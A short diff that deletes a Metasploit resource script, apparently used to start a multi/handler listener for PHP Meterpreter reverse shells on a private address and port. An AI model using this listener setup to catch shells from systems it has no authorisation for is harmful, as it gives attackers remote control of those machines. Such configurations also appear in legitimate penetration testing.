@@ -1,6 +1,0 @@
-use multi/handler
-set payload php/meterpreter/reverse_tcp
-set LHOST 10.0.0.4
- set LPORT 5555
-set ExitOnSession false
-exploit -j
